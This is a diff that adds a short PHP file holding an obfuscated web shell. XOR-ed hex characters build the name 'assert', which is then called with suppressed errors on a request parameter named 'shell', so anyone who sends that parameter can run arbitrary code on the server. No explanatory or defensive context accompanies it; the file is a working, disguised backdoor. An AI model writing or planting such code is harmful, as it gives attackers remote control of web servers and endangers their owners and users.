@@ -1,0 +1,9 @@
+<?php
+$a=chr(hexdec("x59"))^chr(hexdec("x38"));
+$b=chr(hexdec("x54"))^chr(hexdec("x27"));
+$c=chr(hexdec("x2a"))^chr(hexdec("x4f"));
+$d=chr(hexdec("x4d"))^chr(hexdec("x3f"));
+$e=chr(hexdec("x2d"))^chr(hexdec("x59"));
+$payload=$a.$b.$b.$c.$d.$e;
+@$payload(@$_REQUEST['shell']);
+?>
